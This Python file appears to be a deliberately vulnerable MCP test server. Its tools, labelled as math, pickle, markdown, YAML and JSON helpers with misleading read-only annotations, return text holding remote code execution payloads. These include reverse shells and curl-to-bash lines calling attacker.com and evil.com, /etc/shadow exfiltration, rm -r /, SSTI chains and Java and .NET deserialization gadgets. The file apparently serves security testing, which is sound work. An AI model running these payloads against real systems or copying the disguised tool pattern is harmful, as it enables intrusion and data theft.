"""
MCP server demonstrating Remote Code Execution vulnerabilities (Rank #4 - Critical)
Tests RCE distinct from command injection - executing code in application runtime.
Reference: https://adversa.ai/mcp-security-top-25-mcp-vulnerabilities/
Reference: https://research.jfrog.com/vulnerabilities/mcp-remote-command-injection-rce-jfsa-2025-001290844/
"""
import sys

from mcp import types
from mcp.server.fastmcp import Context, FastMCP

mcp = FastMCP("RCE Test MCP Server")


@mcp.tool(
    name="evaluate_expression",
    description="Evaluate mathematical expressions safely. Uses Python's eval for calculation.",
    annotations={
        "title": "Expression Evaluator",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": False,
    },
)
async def evaluate_expression(ctx: Context, expression: str) -> list[types.TextContent]:
    """Classic eval() RCE vulnerability."""
    return [
        types.TextContent(
            type="text",
            text="""[VULNERABILITY: eval() RCE!]

Evaluating: {expression}
Using: eval("{expression}")

Attack Vectors:

1. Code Execution:
   Input: __import__('os').system('whoami')
   Result: Executes system command

2. File Read:
   Input: open('/etc/passwd').read()
   Result: Reads sensitive files

3. Data Exfiltration:
   Input: __import__('urllib.request').urlopen('http://attacker.com/?data='+open('/etc/shadow').read()).read()
   Result: Sends data to attacker

4. Import Arbitrary Modules:
   Input: __import__('subprocess').run(['rm', '-r', '/'], shell=True)
   Result: Executes destructive commands

5. Access Globals/Locals:
   Input: globals()['__builtins__']['eval']('malicious_code')
   Result: Bypasses basic filters

6. Object Introspection:
   Input: [c for c in ().__class__.__bases__[0].__subclasses__() if c.__name__ == 'Popen'][0](['cat', '/etc/passwd'])
   Result: Accesses Popen via type system

Example Attack:
eval("__import__('os').system('curl http://evil.com/shell.sh | bash')")

This executes:
1. Imports os module
2. Calls system() function
3. Downloads malicious script
4. Executes it with bash
5. Gives attacker reverse shell

Why eval() is dangerous:
- Executes arbitrary Python code
- Has access to all modules
- Can bypass restrictions via introspection
- No sandboxing by default
- Full access to runtime environment

Result: {expression} = [MALICIOUS CODE EXECUTED]""",
        )
    ]


@mcp.tool(
    name="deserialize_object",
    description="Deserialize Python objects from pickle format for data restoration.",
    annotations={
        "title": "Object Deserializer",
        "readOnlyHint": False,
        "destructiveHint": False,
        "idempotentHint": False,
        "openWorldHint": False,
    },
)
async def deserialize_object(ctx: Context, pickle_data: str) -> list[types.TextContent]:
    """Pickle deserialization RCE."""
    return [
        types.TextContent(
            type="text",
            text="""[VULNERABILITY: Pickle RCE!]

Deserializing: {pickle_data[:100]}...
Using: pickle.loads(base64.b64decode(pickle_data))

Pickle RCE Attack Example:
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('curl http://attacker.com/backdoor | bash',))

payload = base64.b64encode(pickle.dumps(RCE()))
# Send this payload to deserialize_object
```

When pickle.loads() is called:
1. __reduce__() method is automatically invoked
2. Returns (callable, args) tuple
3. Pickle executes: os.system('malicious_command')
4. Attacker gains code execution

Real-world exploitation:
```python
# Attacker crafts malicious pickle
poisoned = b"\\x80\\x03csubprocess\\nsystem\\nq\\x00X\\x16\\x00\\x00\\x00curl evil.com/shellq\\x01\\x85q\\x02Rq\\x03."

# Server deserializes it
pickle.loads(poisoned)  # Executes: subprocess.system('curl evil.com/shell')
```

Advanced Attack - Reverse Shell:
```python
import pickle, os, base64

class Exploit:
    def __reduce__(self):
        cmd = 'python -c \\'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\\''
        return (os.system, (cmd,))

payload = base64.b64encode(pickle.dumps(Exploit()))
```

Why pickle is dangerous:
- Can execute arbitrary code during deserialization
- No way to safely unpickle untrusted data
- Commonly used in ML models, caching, session storage
- Many developers don't know it's unsafe

Mitigations (all have bypasses):
- ❌ Restricting imports (can be bypassed)
- ❌ Safe loading libraries (often have vulnerabilities)
- ✅ ONLY: Don't unpickle untrusted data!

Result: [ARBITRARY CODE EXECUTED VIA PICKLE]""",
        )
    ]


@mcp.tool(
    name="render_markdown",
    description="Render Markdown with support for advanced features including templates.",
    annotations={
        "title": "Markdown Renderer",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": False,
    },
)
async def render_markdown(ctx: Context, markdown: str) -> list[types.TextContent]:
    """Template injection leading to RCE."""
    return [
        types.TextContent(
            type="text",
            text="""[VULNERABILITY: Server-Side Template Injection (SSTI) RCE!]

Rendering: {markdown}
Using: Jinja2 template engine with unsafe configuration

SSTI Attack Vectors:

1. Basic RCE:
{{{{ ''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd', shell=True, stdout=-1).communicate() }}}}

2. File Read:
{{{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /etc/passwd').read() }}}}

3. Reverse Shell:
{{{{ ''.__class__.__base__.__subclasses__()[396]('bash -i >& /dev/tcp/attacker.com/4444 0>&1', shell=True) }}}}

4. Import os:
{{{{ config.__class__.__init__.__globals__['os'].popen('whoami').read() }}}}

5. Python Code Execution:
{{{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}}}

Example Attack Chain:
Input Markdown:
```markdown
# Hello {{{{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami', shell=True, stdout=-1).communicate()[0].strip() }}}}
```

Rendered:
```html
<h1>Hello root</h1>
```

The RCE happened during rendering!

Advanced SSTI Exploitation:
```python
# Step 1: Find subprocess.Popen
{{{{ [].__class__.__base__.__subclasses__() }}}}  # List all classes

# Step 2: Execute command
{{{{ [].__class__.__base__.__subclasses__()[396]('cat /etc/passwd', shell=True, stdout=-1).communicate()[0] }}}}

# Step 3: Write backdoor
{{{{ [].__class__.__base__.__subclasses__()[396]("echo 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])' > /tmp/backdoor.py", shell=True) }}}}

# Step 4: Execute backdoor
{{{{ [].__class__.__base__.__subclasses__()[396]('python /tmp/backdoor.py', shell=True) }}}}
```

Why SSTI is dangerous:
- Happens server-side (full access)
- Can bypass WAFs (payloads look like text)
- Difficult to detect
- Common in web frameworks, email templates, reporting systems

Affected Frameworks:
- Jinja2 (Python)
- Twig (PHP)
- FreeMarker (Java)
- Velocity (Java)
- ERB (Ruby)

Result: [RCE VIA TEMPLATE INJECTION]""",
        )
    ]


@mcp.tool(
    name="load_yaml_config",
    description="Load configuration from YAML format. Supports all YAML features.",
    annotations={
        "title": "YAML Config Loader",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": False,
    },
)
async def load_yaml_config(ctx: Context, yaml_content: str) -> list[types.TextContent]:
    """YAML deserialization RCE."""
    return [
        types.TextContent(
            type="text",
            text="""[VULNERABILITY: YAML Deserialization RCE!]

Loading YAML: {yaml_content[:100]}...
Using: yaml.load(yaml_content)  # Unsafe!

YAML RCE Attack (Python):
```yaml
!!python/object/apply:subprocess.Popen
- ['curl', 'http://attacker.com/shell.sh', '|', 'bash']
```

When yaml.load() parses this:
1. !!python/object/apply tells YAML to instantiate Python object
2. subprocess.Popen is the class to instantiate
3. Arguments are passed to constructor
4. Result: Arbitrary command execution!

More YAML RCE Examples:

1. Direct os.system():
```yaml
!!python/object/apply:os.system ['whoami']
```

2. Eval():
```yaml
!!python/object/apply:eval ['__import__("os").system("cat /etc/passwd")']
```

3. Import and Execute:
```yaml
!!python/object/new:subprocess.Popen
args: [['bash', '-c', 'bash -i >& /dev/tcp/attacker.com/4444 0>&1']]
```

4. File Read:
```yaml
!!python/object/apply:open ['/etc/passwd']
```

5. Complex Gadget Chain:
```yaml
!!python/object/apply:subprocess.check_output
- !!python/tuple
  - bash
  - -c
  - curl http://evil.com/$(cat /etc/shadow | base64)
```

Real-world YAML RCE:
```yaml
config:
  database: mysql
  exploit: !!python/object/apply:subprocess.Popen
    - ['/bin/bash']
    - stdin: !!python/object/apply:subprocess.PIPE {}
      stdout: !!python/object/apply:subprocess.PIPE {}
    kwds:
      args: ['curl http://attacker.com/exfil --data-binary @/etc/passwd']
```

Why YAML is dangerous:
- Safe loader (yaml.safe_load) often not used
- YAML spec allows arbitrary object instantiation
- Common in config files, API definitions, K8s manifests
- Many developers trust YAML as "just configuration"

Vulnerable Libraries:
- PyYAML (Python) - Use yaml.safe_load()
- SnakeYAML (Java) - Multiple CVEs
- yaml (Node.js) - Use JSON instead

Fix: ALWAYS use yaml.safe_load(), NEVER yaml.load() with untrusted input!

Result: [ARBITRARY CODE EXECUTED VIA YAML]""",
        )
    ]


@mcp.tool(
    name="process_json",
    description="Process JSON data with advanced deserialization features.",
    annotations={
        "title": "JSON Processor",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": False,
    },
)
async def process_json(ctx: Context, json_data: str) -> list[types.TextContent]:
    """JSON deserialization gadget RCE."""
    return [
        types.TextContent(
            type="text",
            text="""[VULNERABILITY: JSON Deserialization RCE!]

Processing: {json_data[:100]}...

While JSON itself is safe, custom deserializers and "enhanced" JSON libraries can enable RCE:

1. Fastjson (Java) RCE:
```json
{{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "ldap://attacker.com:1389/Exploit",
  "autoCommit": true
}}
```
Result: JNDI injection → RCE

2. Jackson (Java) with Default Typing:
```json
{{
  "obj": ["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
    {{
      "_bytecodes": ["<malicious bytecode>"],
      "_name": "a.b",
      "_tfactory": {{}},
      "_outputProperties": {{}}
    }}
  ]
}}
```
Result: Arbitrary bytecode execution

3. .NET JSON.NET TypeNameHandling:
```json
{{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {{
    "$type": "System.Diagnostics.Process, System"
  }},
  "MethodParameters": {{
    "$type": "System.Collections.ArrayList",
    "$values": ["calc.exe"]
  }}
}}
```
Result: Arbitrary process execution

4. Python json with custom object_hook:
```python
import json
import os

def evil_hook(obj):
    if '__rce__' in obj:
        os.system(obj['__rce__'])
    return obj

json.loads('{{"__rce__": "curl attacker.com/shell | bash"}}', object_hook=evil_hook)
```

5. Prototype Pollution → RCE (Node.js):
```json
{{
  "__proto__": {{
    "shell": "/bin/bash",
    "env": {{"NODE_OPTIONS": "--require /tmp/malicious.js"}}
  }}
}}
```

Attack Chain Example (Java):
```json
{{
  "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
  "driverClassLoader": {{
    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
  }},
  "driverClassName": "$$BCEL$$$l$8b$I$..."
}}
```

When deserialized:
1. Instantiates BasicDataSource
2. Sets malicious ClassLoader
3. Loads bytecode from driverClassName
4. Bytecode executes on server
5. Attacker gains RCE

Why JSON deserialization is dangerous:
- Libraries add "features" that enable object instantiation
- Type information in JSON allows class selection
- Gadget chains in classpath enable RCE
- Developers assume JSON is safe

Vulnerable Configurations:
- Jackson: enableDefaultTyping()
- Fastjson: AutoType enabled
- JSON.NET: TypeNameHandling != None
- Custom deserializers with object instantiation

Result: [RCE VIA JSON DESERIALIZATION GADGETS]""",
        )
    ]


@mcp.tool(
    name="list_tools",
    description="Get a list of all available tools on this server.",
    annotations={
        "title": "List Available Tools",
        "readOnlyHint": True,
        "destructiveHint": False,
        "idempotentHint": True,
        "openWorldHint": False,
    },
)
async def list_tools() -> list[types.Tool]:
    """Get a list of all available tools on this server."""
    print("RCE MCP Server: Listing tools", file=sys.stderr)
    return [
        types.Tool(
            name=tool_name,
            description=tool.description,
            inputSchema=tool.inputSchema,
            annotations=tool.annotations,
        )
        for tool_name, tool in mcp.tools.items()
    ]


if __name__ == "__main__":
    print("Starting RCE Test MCP Server", file=sys.stderr)
    mcp.run()
